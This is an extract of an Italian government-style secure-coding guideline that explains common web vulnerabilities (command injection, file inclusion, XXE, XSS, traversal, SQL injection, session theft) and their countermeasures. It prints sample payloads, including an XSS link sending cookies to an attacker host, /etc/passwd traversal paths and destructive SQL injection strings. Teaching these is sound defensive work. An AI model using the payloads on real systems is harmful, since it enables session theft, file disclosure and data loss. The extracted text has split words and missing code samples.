@@ -1,0 +1,1150 @@
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 23  a 156  
+ 
+6 PRINCIPALI VULNERABILITÀ DERIVANTI DA ERRORI DI 
+PROGRAMMAZIONE: OVERVIEW 
+Nel presente capitolo viene fornita un overwiev del le principali vulnerabilità, ad oggi conosciute, ch e 
+scaturiscono da errori di programmazione indicando le buone pratiche che, indipendentemente dal 
+linguaggio di programmazione utilizzato, è necessar io adottare al fine di ridurre il rischio (common b est 
+practices). 
+A tal fine, si evidenzia che il 90% delle vulnerabi lità nel software deriva da due distinte macro-cate gorie di 
+errori di programmazione:  
+• una poco accorta gestione dell’input utente; 
+• controlli erronei o assenti durante l’allocazione d elle aree di memoria adibite a contenere i dati.  
+ 
+A queste macro-categorie vanno ad aggiungersi: 
+• le problematiche di gestione delle sessioni utente;  
+• l’assenza di meccanismi crittografici a protezione dei dati scambiati in rete o conservati su disco; 
+• le vulnerabilità correlate al controllo degli acces si. 
+ 
+Vi è inoltre un fattore di media entità che, seppur  non infici in via diretta la sicurezza di un softw are o di un 
+sistema, consente a una minaccia esterna di acquisi re informazioni preziose sullo stato dell’applicazi one e 
+di ottenere utili spunti per progredire gradualment e verso tecniche di attacco più complesse e sempre più 
+finalizzate all’accesso fraudolento o al trafugamen to dei dati. Queste tematiche, congiuntamente a que lle 
+circostanze possono indurre al blocco del sistema o  del software 
+6.1  Validazione dell’input 
+ Il programmatore, spesso, non si pone il problema che gli utenti autorizzati, che possiedono una rego lare 
+password d’accesso, potrebbero non essere gli unici  coinvolti a interagire con l’applicazione e si dà per 
+scontato che l’input acquisito, in ingresso, dal pr ogramma sarà sempre conforme e pertinente al caso.  
+Le vulnerabilità di Input Validation scaturiscono p roprio dall’assenza di controlli o da errori nella gestione 
+dei dati inviati dall’utente e/o da un processo est erno al dominio di analisi. Le conseguenze di tali 
+vulnerabilità consistono in una serie di tecniche d i attacco differenti, solitamente finalizzate all’e secuzione 
+di comandi remoti o alla visualizzazione di dati im portanti. 
+È necessario quindi, verificare che l’input dell’ut ente e la sua rappresentazione non contenga caratte ri o 
+sequenze di caratteri che possono essere sfruttati in modo malizioso.  
+La validazione dell'input deve essere implementata utilizzando espressioni regolari, o algoritmi di fi ltro, 
+dopo aver definito la lista di ciò che può essere a ccettato. La white list, contentente solo i valori ammissibili, 
+è da preferire alla black list, che elenca i valori  non ammissibii, poichéil continuo evolversi degli attacchi 
+rende l’insieme delle stringhe ‘non accettabili’, d i fatto, infinito. 
+Le problematiche di Input Validation sono comuni a tutti gli ambienti, ma trovano la loro espressione 
+massima nelle applicazioni Web. Di seguito sono tra ttate le principali vulnerabilità, causate dal manc ato 
+filtro dei dati utente, nelle quali un aggressore p uò imbattersi sul Web, presentate da script, Servle t o CGI. 
+6.1.1  Shell Execution Command 
+Se nella casistica degli Overflow la vulnerabilità di riferimento è lo Stack Overflow, nelle applicazi oni Web è 
+senza dubbio lo Shell Execution Command. Le problem atiche di Shell Execution Command, infatti, rientra no 
+nella sfera delle vulnerabilità più note e più sfru ttate di sempre . Si manifesta quando i parametri a cquisiti 
+in input vengono passati all’interprete di shell se nza essere filtrati. L’esecuzione di un comando non  è 
+spesso possibile in modo diretto (ovvero sempliceme nte specificando ciò che si desidera eseguire), ma 
+viene causata da una precisa condizione. Sui sistem i Unix è, ad esempio, possibile utilizzare il carat tere “;” 
+per concatenare più comandi fra loro, mentre in mol ti altri casi la condizione scatenante può essere c ausata 
+da caratteri differenti come: 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 24  a 156  
+ 
+• ritorno a carrello (\x0a); 
+• new Line (\x0c); 
+• NULL byte (\x00); 
+• altri. 
+ 
+Esempio:  
+Esempio di script vulnerabile a Shell Execution Com mand: 
+ 
+ 
+Contromisure 
+Scrivere il codice in modo che non venga eseguita n essuna shell dei comandi.  
+È deprecata l’invocazione diretta dei comandi di si stema, soprattutto se utilizza l’input utente. Per accedere 
+alle funzioni del sistema operativo, è obbligatorio  utilizzare le API messe a disposizione dalle libre rie dei vari 
+linguaggi di programmazione. 
+Se dovessero permanere nel sorgente delle shell dip endenti dall’input dell’utente, occorre allora vali dare 
+l’input, filtrando parole e caratteri potenzialment e dannosi. Meglio ancora se si verifica preventivam ente 
+l’input dell’utente confrontandolo con una white li st di valori ammessi. 
+6.1.2  File Inclusion 
+Le problematiche di File Inclusion sono solitamente  riscontrabili nelle applicazioni web. Si sono diff use negli 
+ultimi anni con il boom dei linguaggi e delle tecno logie di scripting (ASP, PHP, Python, Perl, etc..) e si 
+manifestano quando i parametri passati ad uno scrip t vulnerabile non vengono opportunamente verificati  
+prima di essere utilizzati per includere dei file i n determinati punti di un portale.  
+Le problematiche di File Inclusion si distinguono s olitamente in due categorie: 
+• Local File Inclusion : si manifestano quando un aggressore passa, come p arametri di uno script 
+vulnerabile, dei file residenti localmente nel sist ema. Il loro contenuto viene così visualizzato a 
+video nell’esatto punto del portale in cui si verif ica l’inclusione. Un aggressore può in questo modo 
+ottenere gli hash delle password di sistema o acced ere ad informazioni riservate collocate 
+all’esterno della document root del Web Server. Le problematiche di Local File Inclusion possono 
+anche essere sfruttate per eseguire comandi remoti se l’aggressore ha la possibilità di collocare 
+localmente un file contenente codice malevolo, che può essere puntato dallo script vulnerabile. Il 
+file può essere trasmesso utilizzando i classici se rvizi di rete (ftp, ssh, cifs, etc..) o usufruendo di una 
+qualsiasi procedura di upload richiamabile da Web 
+• Remote File Inclusion : è la più pericolosa perché permette a un aggresso re di passare, come 
+parametri di uno script vulnerabile, un file che ri siede in un altro web server (ad esempio da egli 
+stesso controllato). L’aggressore può collocare all ’interno di questo file del codice di scripting (ad  
+esempio codice PHP malevolo) per eseguire comandi r emoti sul sistema. 
+ 
+Esempio:  
+Un URL costruito come segue: 
+http://vulnerable_host/preview.php?file=example.htm l  
+Può essere modificato come segue, per visualizzare,  ad esempio, un file locale dal contenuto sensibile : 
+http://vulnerable_host/preview.php?file=../../../.. /etc/passwd 
+Contromisure 
+Occorre evitare di utilizzare file esterni il cui c ontenuto sia di difficile verifica. Nel caso in cui  non se ne 
+possa fare a meno, occorre predisporre una white li st di file ammessi. Solo tali file saranno selezion abili da 
+parte dell’utente, per esempio tramite un indice nu merico. Tale approccio è molto facile da mettere in  
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 25  a 156  
+ 
+pratica nel caso di file locali. Nel caso dei remot e files non vi è altra soluzione che verificare il contenuto o 
+l’hash del file prima di adoperarlo in qualsiasi mo do. 
+6.1.3  XML external entity (XXE) injection 
+L' XML external entity injection, o iniezione di en tità esterne XML, nota anche come XXE, è una vulner abilità 
+della sicurezza che consente a un attaccante di man ipolare l'elaborazione di dati XML da parte di 
+un'applicazione web. L’attaccante può essere in gra do di accedere al file system dell’application serv er e di 
+interagire con qualsiasi sistema esterno a cui l'ap plicazione stessa è autorizzata ad accedere. In alc une 
+situazioni, può portare alle estreme conseguenze l’ attacco, fino a compromettere il server sottostante  o 
+altre infrastrutture di back-end, sfruttando la vul nerabilità XXE e falsificando delle richieste sul l ato server 
+(SSRF). 
+Alcune applicazioni utilizzano il formato XML per t rasmettere dati tra il browser e il server. Le appl icazioni 
+che lo fanno praticamente utilizzano sempre una lib reria standard o un'API della piattaforma per elabo rare 
+i dati XML sul server. Le vulnerabilità di XXE sorg ono perché la specifica XML contiene varie funziona lità 
+potenzialmente pericolose e i parser standard suppo rtano queste funzionalità, anche se non vengono 
+normalmente utilizzate dall'applicazione. 
+Le entità esterne XML sono un tipo di entità XML pe rsonalizzata i cui valori definiti vengono caricati  
+dall'esterno del DTD in cui sono dichiarati. Le ent ità esterne sono particolarmente interessanti dal p unto di 
+vista della sicurezza perché consentono di definire  un'entità in base al contenuto di un percorso di f ile o 
+URL. 
+Le entità XML sono un modo per rappresentare un ele mento di dati all'interno di un documento XML, 
+anziché utilizzare i dati stessi. Varie entità sono  integrate nelle specifiche del linguaggio XML. Per  esempio, 
+le entità &lt; e &gt; rappresetano i metacaratteri ‘<’ e ‘>’. Poiché sono usati per indicare i tag XML , devono 
+generalmente essere rappresentati usando le loro en tità quando compaiono all'interno dei dati. 
+L’XML consente di indicare delle entità personalizz ate all’interno del loro DTD di riferimento, come 
+nell’esempio seguente:  
+ 
+<!DOCTYPE foo [ <!ENTITY entitaPersonalizzata "enti tà personalizzazta per usi 
+interni" > ]> 
+ 
+Questa definizione significa che qualsiasi utilizzo  dell'entità &entitaPersonalizzata; all'interno del  
+documento XML verrà sostituito con il valore defini to: "entità personalizzazta per usi interni". 
+Se un utente ha la possibilità di intodurre un’enti tà che si riferisca a una risorse esterna, il parse r XML 
+riporterà all’interno dell’applicazione qualsiasi c ontenuto. Un malintenzionato può così introdurre e far 
+eseguire codice malevolo. 
+Ad esempio può essere referenziato un percorso URL,  che può puntare a un file del sistema operativo 
+(tramite il protocollo file://) o esterno (tramite il protocollo http://). 
+ 
+Esempio:  
+Entità esterna che espone a vulnerabilità l’applica zione: 
+ 
+<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/t o/file" > ]> 
+ 
+Se si indica il file  /etc/passwd , se ne ottiene l’automatica lettura e inclusione n el documento.  
+ 
+Contromisure 
+Tutte le vulnerabilità XXE sorgono perché la librer ia di parsing dell’XML utilizzata dall'applicazione  supporta 
+funzionalità XML potenzialmente pericolose. Il modo  più semplice ed efficace per prevenire gli attacch i XXE 
+è disabilitare tali funzionalità. 
+ 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 26  a 156  
+ 
+In generale, è sufficiente disabilitare la risoluzi one automatica di entità esterne e disabilitare il supporto per 
+XInclude, una parte della specifica XML che consent e di creare un documento XML a partire da 
+sottodocumenti. Questo di solito può essere fatto t ramite opzioni di configurazione o sostituendo a li vello 
+di programmazione il comportamento predefinito. Con sultare la documentazione per la libreria o l’API c he 
+si occupa del parsng dell’XML per dettagli su come disabilitare le funzionalità pericolose e non neces sarie. 
+6.1.4  Insecure Deserialization 
+Quando dati organizzati in strutture come matrici, record, grafici, classi o altre configurazioni, dev ono 
+essere archiviate o trasmesse in un'altra posizione , ad esempio attraverso una rete, devono passare 
+attraverso un processo chiamato serializzazione. Qu esto processo converte e modifica l'organizzazione dei 
+dati in un formato lineare, semplice da trasmettere  e da archiviare su dispositivi di storage. 
+La deserializzazione, al contrario, converte il dat o lineare in dato strutturato, istanziando l’oggett o per l’uso 
+da parte del processo di destinazione. 
+I formati degli oggetti serializzati sono standardi zzati in modo da poter essere letti da piattaforme diverse, 
+se necessario. Alcune delle piattaforme che support ano i processi di serializzazione includono python,  perl, 
+php, ruby e Java. Anche la piattaforma Microsoft .N ET supporta le funzioni di serializzazione con  le classi 
+XMLSerializer e DataContractSerializer, nonché le c lassi BinaryFormatter e NetDataContractSerializer, più 
+potenti ma più vulnerabili. XML, YAML e JSON sono t ra i formati di dati serializzati più comunemente 
+utilizzati. 
+La vulnerabilità di deserializzazione non sicura si  presenta nel momento in cui un attaccante è in gra do di 
+iniettare dati dannosi all’interno dei dati seriali zzati. Lo sfruttamento di tale attacco si compie qu ando dal 
+dato serializzato il processo di destinazione crea un’istanza attiva. 
+Contromisure 
+Per mitigare il rischio di attacco attraverso una d eserializzazione non sicura è indispensabile ridurr e al 
+minimo l'utilizzo della deserializzazione, riducend o i trasferimenti di dati non necessari tra applica zioni / 
+sistemi, riducendo anche la quantità di file scritt i su disco. 
+Occorre, inoltre, aderire al principio del privileg io minimo, minimizzando o disabilitando l'accesso a i 
+privilegi amministrativi per ridurre l'impatto di u n possibile attacco andato a buon fine (defense in depth). 
+ 
+6.1.5  Cross Site Scripting (XSS) 
+Il Cross Site Scripting (XSS) è una problematica so litamente riscontrabile nelle applicazioni Web e co nsiste 
+nella possibilità di inserire codice HTML o client- side scripting (comunemente Javascript) all’interno  di una 
+pagina visualizzata da altri utenti. Un aggressore può, in questo modo, forzare l’esecuzione del codic e 
+Javascript all’interno del browser utilizzato dal v isitatore.  
+L’uso più comune del Cross Site Scripting è finaliz zato all’intercettazione dei cookie e/o dei token d i un 
+utente regolarmente autenticato in un portale e qui ndi all’appropriazione indebita delle sessioni web da 
+esso intraprese. Con le credenziali rubate, l’attac cante si spaccerà per l’utente legittimo (spoofing) .  
+Esistono diverse forme di Cross Site Scripting, ma il funzionamento di base è sempre lo stesso. A vari are è 
+invece la tecnica utilizzata per forzare l’esecuzio ne di codice Javascript nel browser del visitatore.  In alcuni 
+casi un aggressore ha la possibilità di iniettare c odice persistente nella pagina web vulnerabile, ovv ero 
+codice memorizzato dal server (ad esempio su un dat abase) e riproposto al client durante ogni singolo 
+collegamento. In altre circostanze il codice iniett ato non viene memorizzato e la sua esecuzione è res a 
+possibile solamente invogliando l’utente, attravers o tecniche di Social Engineering, a cliccare su un link che 
+punta alla pagina web vulnerabile. In quest’ultimo caso L’URL viene solitamente rappresentato in forma to 
+esadecimale (o altre forme) per evitare che l’utent e possa identificare il codice Javascript passato c ome 
+parametro alla pagina stessa. In altri casi l’aggre ssore può beneficiare di tecniche di url spoofing p er 
+mascherare il codice malevolo. Questa tecnica consi ste nel mascherare l’url fraudolento al fine di far lo 
+sembrare del tutto simile all’url legittimo sul qua le ci si aspetta che l’utente clicchi. 
+ 
+Le vulnerabilità di Cross Site Scripting (XSS) poss ono essere in particolare sfruttate da un aggressor e per: 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 27  a 156  
+ 
+• Prendere il controllo remoto di un browser; 
+• Ottenere un cookie; 
+• Modificare il collegamento ad una pagina; 
+• Redirigere l’utente a un URI differente dall’origin ale; 
+• Forzare l’immissione di dati importanti in form non -trusted (phishing); 
+ 
+Esempio:  
+Segue un esempio di servlet vulnerabile a Cross Sit e Scripting: 
+ 
+Contromisure 
+Al fine di evitare il Cross Site Scripting è di fon damentale importanza verificare l’input che provien e 
+dall’esterno, prima di utilizzarlo all’interno dell a web application. 
+Tale verifica comporta l’utilizzazione di funzioni di escaping, le quali rilevano caratteri ritenuti p ericolosi, ad 
+esempio <, >, &, /, ’ ,” , sostituendoli con del te sto. 
+Esistono a tal proposito molte librerie che consent ono di neutralizzare tag html, come anche pezzi di codice 
+Javascript. 
+6.1.6  Directory Traversal 
+Le problematiche di Directory Traversal, note anche  come Dot-Dot Vulnerability, si verificano quando u n 
+aggressore ha la possibilità di immettere dell’inpu t che verrà utilizzato dall’applicazione per accede re ad un 
+file in lettura e/o scrittura. Solitamente le appli cazioni vietano l’utilizzo di percorsi completi (ad  esempio 
+/etc/shadow o c:\winnt\system32\cmd.exe) ma in assenza di controlli sui dati acquisiti in 
+ingresso, un aggressore può ugualmente raggiungere e acquisire il contenuto di un file residente all’e sterno 
+dell’area a lui accessibile, anteponendo una sequen za di punti al nome dello stesso (ad esempio 
+../../../../nomefile  oppure .../.../.../nomefile ). Poiché le problematiche di Directory 
+Traversal sono state utilizzate dagli aggressori fi n dallo sviluppo dei primi Web Server, sono oggi tr a le più 
+note. Non a caso molte applicazioni vengono progett ate in modo da mitigare il rischio del loro 
+sfruttamento. Alcune fra queste tentano di corregge re i dati non validi acquisiti in input, trasforman doli in 
+un flusso considerato valido. La casistica ha comun que dimostrato che è quasi sempre sconsigliato (al di 
+fuori di specifiche eccezioni) affidarsi all’input utente per costruire nomi file e percorsi all’inter no 
+dell’applicazione, in quanto vi è un’alta possibili tà di introdurre ulteriori fattori di instabilità o  insicurezza 
+all’interno del software sviluppato. 
+ 
+Esempio:  
+Se nel codice sorgente viene utilizzato il nome del  file: 
+BufferedReader reader = new BufferedReader(new File Reader(“data/”+ argv[1] )); 
+String line = reader.readLine(); 
+while(line!=null) { 
+   System.out.println(line); 
+   line = reader.readLine(); 
+} 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 28  a 156  
+ 
+Il codice sorgente può essere manomesso, per ottene re l’accesso a un file sensibile, sostituendo il no me del 
+file con il percorso al file ‘sensibilè al quale si  vuole accedere: 
+../../../../etc/password 
+Contromisure 
+In una web application si dovrebbe evitare di utili zzare percorsi di file system inseriti dall'utente.  Se l'utente 
+dovesse scegliere un file, occorrerebbe limitare la  selezione imponendogli una scelta limitata di file  
+ammessi (white list), attraverso un indice numerico . Nel caso in cui fosse necessario utilizzare un pe rcorso 
+fornito dall'utente, occorrerebbe verificarlo e/o s ottoporlo a escaping. 
+Un'altra contromisura, valida soprattutto sui siste mi Unix/Linux, potrebbe essere quella di creare una  
+chroot jail, ossia non permettere di sfuggire alla root accessibile dalla web application, in maniera tale da 
+salvaguardare le directory critiche del sistema ope rativo. Lo stesso risultato potrebbe essere raggiun to 
+consentendo l’accesso a un utente che ha accesso li mitato, la cui home directory coincida con la docum ent 
+root. 
+6.1.7  SQL Injection 
+SQL Injection è una problematica che colpisce princ ipalmente le applicazioni Web che s’interfacciano a  un 
+layer di back-end che utilizza un database relazion ale, anche se non unicamente circoscrivibile a 
+quest’ambito. La SQL Injection è, infatti, una vuln erabilità che affligge tutte le applicazioni (anche  
+client/server) che interrogano un DB. Si verifica q uando uno script o un’altra componente applicativa non 
+filtra opportunamente l’input passato dall’utente, rendendo possibile per un aggressore l’alterazione della 
+struttura originaria della query SQL, attraverso l’ utilizzo di caratteri speciali (ad esempio apici e virgolette) o 
+mediante la concatenazione di costrutti multipli (a d esempio utilizzando la keyword SQL UNION). A seco nda 
+delle circostanze e del tipo di database server con  cui l’applicazione si interfaccia, l’aggressore pu ò sfruttare 
+una problematica di SQL Injection per: 
+• Bypassare i meccanismi di autenticazione di un port ale (ad esempio forzando il ritorno di condizioni 
+veritiere alle procedure di controllo); 
+• Ricostruire il contenuto di un Database (ad esempio  localizzando le tabelle contenenti i token delle 
+sessioni attive, visualizzando le password degli ut enti cifrate/non cifrate o altre informazioni di 
+natura critica); 
+• Aggiungere, alterare o rimuovere i dati già present i nel Database; 
+• Eseguire stored-procedures. 
+ 
+Si riportano di seguito tre problematiche di SQL In jection che rappresentano le tecniche di base da cu i 
+derivano tutti i casi possibili: 
+• Iniezione di una seconda query mediante il caratter e “;” 
+Esempio: 
+Si consideri la query: $sql = "SELECT * from utenti  WHERE id=$id"; 
+Se il parametro $id  fosse acquisito da input utente e inizializzato al la stringa: 1; DROP table utenti  
+La query risultante sarebbe: SELECT * from utenti WHERE id=1; DROP table utenti  che causerebbe la 
+rimozione da parte dell’aggressore della tabella ut enti. Le query multiple non sono comunque 
+supportate da tutti I database server. 
+• Modifica della query attraverso introduzione del co mmento ‘--‘ 
+Esempio: 
+Si consideri la query: $sql = "SELECT * from utenti  WHERE login='$login' AND 
+password='$password'"; 
+Se il parametro $login fosse acquisito da input utente ed inizializzato al la stringa: xyz' OR 1=1 –-  
+La query risultante sarebbe: SELECT * from utenti WHERE login='xyz' OR 1=1 --' A ND password=''  ed il 
+database tratterebbe la parte successiva a “--“ com e commento, ignorandola e permettendo quindi 
+all’aggressore di accedere senza specificare alcuna  password. 
+• Iniezione di caratteri jolly ed eliminazione di par te della query: 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 29  a 156  
+ 
+• Esempio: 
+Si consideri la query: $sql = "SELECT * FROM fattur e WHERE nome_cliente LIKE '%".$nome."%' AND 
+ref_cliente=2 ORDER BY num_fattura ASC" 
+Se il parametro $nome fosse acquisito da input utente e inizializzato all a stringa: %' #  
+La query risultante sarebbe: SELECT * FROM fatture WHERE nome_cliente LIKE '%%' # AND 
+ref_cliente=2 ORDER. 
+ 
+Esempio di Script vulnerabile a SQL Injection: 
+ 
+Contromisure 
+Per impedire un attacco di SQL Injection è necessar io evitare di concatenare le stringhe delle query e  
+affidarsi alle stored procedures e alle query param etriche (prepared statement). Può essere utile util izzare 
+una libreria ORM come EntityFramework, Hibernate, o r iBatis, ma questa tecnologia – di per sé - non me tte 
+al riparo dalla SQL Injection. 
+6.2  Session Management 
+Le problematiche di Session Management sono partico larmente comuni nelle applicazioni Web e più in 
+generale in tutte quelle applicazioni che gestiscon o sessioni di collegamento inidividuali di ciascun client. 
+Errori di progettazione del software in questo caso  possono consentire a utenti non autorizzati di acc edere 
+a dati protetti. Un aggressore può appropriarsi del la sessione di collegamento di un utente lecito ope rando 
+al suo posto, impedendo a quest’ultimo di accedere a una o più risorse.  
+ 
+La prevenzione di tali attacchi può essere messa in  atto in diversi modi, ad esempio rigenereando l’id  di 
+sessione a ogni login. La stessa cosa può essere fa tta con i cookies, rigenerandoli a ogni chiamata. È  
+possibile utilizzare un id di sessione molto lungo,  in modo che non possa essere facilemente indovinat o. 
+Nessuna di queste misure, tuttavia, riesce a elimin are del tutto il rischio di furto di sessione. L'un ico rimedio 
+veramente efficace è utilizzare una connessione sic ura con SSL/TLS. 
+ 
+Di seguito sono descritte le principali cause e vul nerabilità che danno origine a problematiche di Ses sion 
+Management. 
+6.2.1  Session Stealing e Hjihacking 
+Un aggressore che riesce ad ottenere l’identificati vo di una sessione (detto anche token) o il cookie di un 
+utente e replicarlo esattamente in una o più richie ste inviate al server, ha la capacità di accedere a d aree o 
+risorse che dovrebbero solo essere riservate all’ut enza lecita, bypassando in modo diretto i meccanism i di 
+autenticazione dell’applicazione.  
+Sono diverse le cause che agevolano o permettono di  portare a termine attività di Session Stealing/Ses sion 
+Hjhacking, di seguito vengono proposte le più comun i. 
+ 
+Esempio:  
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 30  a 156  
+ 
+Tramite la tecnica del DNS poisoning, l’attaccante può inserire record falsati nella cache del DNS Ser ver di 
+cui si serve l’applicazione. Un file utilizzato dal l’applicazione viene risolto puntando a un file for nito 
+dall’attaccante. L’url http://www.example.com/img_4 _cookie.jpg viene risolto dirigendo la richiesta ve rso il 
+file con lo stesso nome fornito dalla macchina dell ’attaccante. Il sito sotto attacco, a quel punto, i nvierà 
+proprio all’attaccante il suo cookie. Dal cookie il  malintenzionato potrà leggere l’id di sessione e u tilizzarlo 
+per un’operazione di spoofing. 
+Contromisure 
+Per prevenire il DNS poisoning, il responsabile del  Domain Name Server può adottare misure di protezio ne 
+che vanno sotto il nome di Domain Name System Security Extensions (DNSSEC) . 
+ 
+6.2.1.1  Cookie 
+L’attacco attraverso il quale un aggressore riesce solitamente ad appropriarsi in modo indebito del co okie 
+di un altro utente è il già menzionato Cross Site S cripting. Altri fattori in fase di sviluppo dell’ap plicazione 
+influenzano comunque la possibilità di portare a te rmine con successo un’attività di Session Stealing.  Questi 
+sono in particolare: 
+• La generazione di cookie il cui tempo di scadenza n on è chiaramente indicato; 
+• La generazione di cookie persistenti sul client anc he dopo il termine della sessione; 
+• La generazione di cookie non cifrati e trasmessi tr amite richieste in chiaro (clear-text); 
+• La validità del cookie anche dopo un periodo di ina ttività dell’utente molto lungo; 
+• L’assenza dell’attributo HttpOnly in fase di genera zione del cookie che ne agevola l’accesso a script 
+client-side; 
+• L’utilizzo di valori ricorrenti (prevedibili) invec e che randomici, nella composizione del cookie, 
+durante la sua generazione. 
+ 
+Esempio:  
+Èpossibile entrare in possesso di un cookie di sess ione, tramite un attacco di Cross Site Scripting, a d 
+esempio iniettando il seguente codice: 
+ 
+<a href="#" onclick="window.location = 'http://atta cker.com/stole.cgi?text=' + 
+escape(document.cookie); return false;">Click here! </a> 
+ 
+L’id di sessione, in quanto autenticato, può essere  utilizzato per effettuare richieste considerate va lide 
+verso il server. Le modalità attraverso le quali è possibile sfruttare gli attributi del cookie rubato  per 
+assegnarli alla propria sessione, dipendono dal bro wser. Alcune estensioni, come ad esempio 
+“EditThisCookie” su Chrome, permettono di modificar e agevolmente il cookie che si sta utilizzando. 
+ 
+Contromisure 
+Per garantire la sicurezza, sarebbe opportuno evita re di utilizzare i cookie, ma questo non è facilmen te 
+realizzabile poiché, nel corso del tempo, i cookie sono diventati sempre più indispensabili nella 
+memorizzazione dei dati. Per impedire il furto dei cookie è quindi necessario, farli viaggiare attrave rso 
+connessioni https crittografate. Un’ulteriore prote zione può essere garantita impostando l’attributo 
+HttpOnly a true, che impone che l’accesso al cookie  solo attraverso il protocollo http, e non tramite uno 
+script client. La policy “Same Origin” garantisce c he il cookie venga trasmesso solo nelle chiamate 
+all’interno dello stesso dominio, impedendo che pos sa essere condiviso con chiamate che provengano da 
+altri domini. Questa policy è oggi adottata in mani era predefinita da tutti i maggiori browser. 
+ 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 31  a 156  
+ 
+6.2.1.2  Token di sessione 
+Un token è un identificativo che correla univocamen te una sessione a un utente. Tale valore, una volta  
+generato, viene collocato all’interno del cookie o propagato attraverso l’URL affinché l’applicazione 
+riconosca con esattezza l’utenza e determini, in ba se ai suoi privilegi, le azioni che può svolgere su l portale. 
+Un aggressore può appropriarsi di un token di sessi one in almeno tre modi: 
+• Creandolo sul momento (ad esempio quando il meccani smo di generazione del token è banale, non 
+si basa su valori randomici ed è facilmente ricostr uibile a partire dal nome dell’utente). 
+• Forzando l’utente a rivelarlo con un copia e incoll a dell’URL, se propagato con questa modalità. 
+Spesso vengono utilizzate tecniche di Social Engine ering, allo scopo. 
+• Indovinandolo attraverso tecniche di Brute Forcing.  Ciò è possibile quando l’identificativo della 
+sessione viene generato con valori non randomici o utilizzando una bassa entropia. 
+ 
+Esempio:  
+Un token, come quello che segue, può essere facilme nte intercettato e analizzato: 
+ 
+"result":[ 
+{ 
+"_id":"B663D248CE4C3B63A7422000B03B8F5E0F8E443B", 
+"_rev":"", 
+"token_id":"B663D248CE4C3B63A7422000B03B8F5E0F8E443 B", 
+"sts_id":"username-transformer", 
+"principal_name":"demo", 
+"token_type":"OPENIDCONNECT", 
+"expiration_time":1459376096 
+}] 
+Contromisure 
+Una buona soluzione è di utilizzare la tecnologia J WT (JSON Web Token), per cui le informazioni vengon o 
+firmate in maniera digitale. Il token non viene mem orizzato né nella sessione, né nel database, né alt rove.  
+Un’altra tecnica si avvale del meccanismo conosciut o con l’acronimo OTP (One Time Password): il token è 
+valido se attivato da una password temporanea, rila sciata in tempo reale, in concomitanza con l’operaz ione 
+che s’intende effettuare. 
+ 
+6.2.1.3  Accesso ad aree non autorizzate 
+Un aggressore può in talune circostanze disinteress arsi dei cookie o dei token quando è in grado di ap rire 
+una nuova sessione con i privilegi dell’utente desi derato nei modi seguenti: 
+• bypassando il normale meccanismo di autenticazione dell’applicazione: l’aggressore può sfruttare 
+problematiche di Directory Listing o Directory Trav ersal per accedere ad aree dell’applicazione che 
+dovrebbero essere visibili solo previa autenticazio ne; 
+• facendo leva su alcuni errori logici dell’applicazi one per ottenere la password corrente o 
+sollecitarne un cambio. Questo caso si manifesta so litamente quando: 
+• la procedura di reset della password dell’applicazi one fallisce nell’inviare la password al corretto 
+utente o permette all’aggressore di cambiare improp riamente la casella e-mail alla quale la stessa 
+viene trasmessa; 
+• la password è facilmente determinabile a partire da lla risposta che può essere fornita alla domanda 
+posta per ricordarla (nel caso in cui sia questo il  meccanismo di recupero adottato); 
+• le password di accesso possono essere recuperate in  forma cifrata o in chiaro dal filesystem o dal 
+database sfruttando problematiche di Directory List ing, Directory Traversal, SQL Injection, etc; 
+• con un attacco di brute forcing per ottenere la pas sword direttamente dalla form di autenticazione 
+dell’applicazione: l’aggressore può, di proposito o  involontariamente, determinare il blocco 
+dell’account utente a causa dei meccanismi di lock- out che potrebbero scattare quando 
+l’applicazione rileva un certo numero di tentativi di login falliti. Questo genere di interventi è 
+classificabile nella categoria degli attacchi DoS. 
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 32  a 156  
+ 
+ 
+Esempio:  
+In alcuni casi è possibile modificare l’url di un’a pplicazione web per accedere direttamente alle diec tory del 
+server nel quale è deployata (directory listing). O ccorre disabilitare, a livello di application serve r, l’opzione 
+di browsing delle directory. 
+ 
+ 
+In altri casi vengono sfruttate vulnerabilità conne sse con le directory accessibili dall’esterno (path  
+traversal): www.example.com/lmapp/../../../etc/hosts  
+ 
+In altri casi ancora le regole per il cambio passwo rd non sono sicure: ad esempio non viene richiesto 
+l’inserimento della vecchia password o vengono post e domande di sicurezza le cui risposte sono intuiti ve o 
+ricavabili attraverso il social engeenering. 
+ 
+Contromisure 
+È necessario: 
+• verificare i dati in input (filtrando i caratteri “ ..” e “/”) per evitare i problemi del path traversa l e 
+disabilitare nell’application server il directory l isting.  
+• garantire la robustezza delle password, seguendo re gole precise sulla lunghezza, sulla complessità e 
+sulla durata. Le password devono essere lunghe alme no otto caratteri e contenere lettere 
+minuscole e maiuscole, numeri e simboli non alfanum erici; devono scadere a intervalli regolari, non 
+devono essere inutitive, né devono essere simili al le ultime dodici inserite. 
+ 
+6.3  Crittografia 
+La crittografia rappresenta oggi uno degli strument i più proficui per sviluppare applicazioni software  sicure, 
+capaci di rispondere alle necessità crescenti di pr eservazione dell’integrità e della riservatezza dei  dati, sia 
+in transito sia a riposo. Di seguito vengono riport are le tecniche più comunemente utilizzate dagli 
+aggressori per appropriarsi in modo fraudolento d’i nformazioni private, invertendo il loro processo di  
+cifratura e le vulnerabilità più comuni che permett ono il verificarsi di tali condizioni. 
+Di seguito sono descritte le principali cause e vul nerabilità inerenti problematiche di crittografia. 
+ 
+6.3.1  Sniffing e algoritmi crittografici deboli 
+Uno dei principali motivi addotti a favore dell’uso  della crittografia è quello di preservare la riser vatezza dei 
+dati che vengono scambiati in rete. Le applicazioni  che non implementano alcun meccanismo crittografic o 
+sono le più esposte a tecniche di sniffing, il proc esso di monitoraggio e acquisizione di tutti i pacc hetti di 
+dati che attraversano una determinata rete. L’aggre ssore che riesce ad attestarsi in un punto qualsias i fra i 
+
+ 
+ 
+Linee guida per lo sviluppo sicuro Pag. 33  a 156  
+ 
+due nodi che comunicano (ad esempio nel gateway d’u scita del server) o che riesce a forzare il redirec t del 
+traffico verso la sua postazione, può in pratica ri costruire con estrema semplicità il contenuto delle  sessioni 
